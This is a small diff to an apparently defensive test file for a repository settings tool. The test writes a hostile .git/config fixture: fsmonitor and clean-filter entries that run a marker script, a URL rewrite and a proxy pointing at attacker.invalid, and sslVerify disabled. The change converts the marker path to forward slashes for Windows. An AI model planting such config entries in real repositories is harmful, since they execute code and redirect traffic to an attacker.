@@ -272,9 +272,13 @@ esac
         await writeFile(join(repoDir, ".git", "index"), "fixture\n");
         await writeFile(join(repoDir, "ignored-local.txt"), "keep me\n");
         await writeFile(join(repoDir, "package.json"), '{"version":"1.0.0"}\n');
+        // Forward-slash the marker path: raw Windows backslashes make the whole
+        // config unparseable ("invalid escape"), failing the real-git origin-url
+        // read for the wrong reason instead of exercising the mutable-config threat.
+        const configMarker = gitBashPath(marker);
         await writeFile(
           join(repoDir, ".git", "config"),
-          `[core]\n  fsmonitor = ${marker}\n[filter "attack"]\n  clean = ${marker}\n[url "https://attacker.invalid/"]\n  insteadOf = https://github.com/\n[http]\n  proxy = http://attacker.invalid\n  sslVerify = false\n[remote "origin"]\n  url = https://github.com/darkroomengineering/cc-settings.git\n`,
+          `[core]\n  fsmonitor = ${configMarker}\n[filter "attack"]\n  clean = ${configMarker}\n[url "https://attacker.invalid/"]\n  insteadOf = https://github.com/\n[http]\n  proxy = http://attacker.invalid\n  sslVerify = false\n[remote "origin"]\n  url = https://github.com/darkroomengineering/cc-settings.git\n`,
         );
         await writeFile(
           stagedSetup,
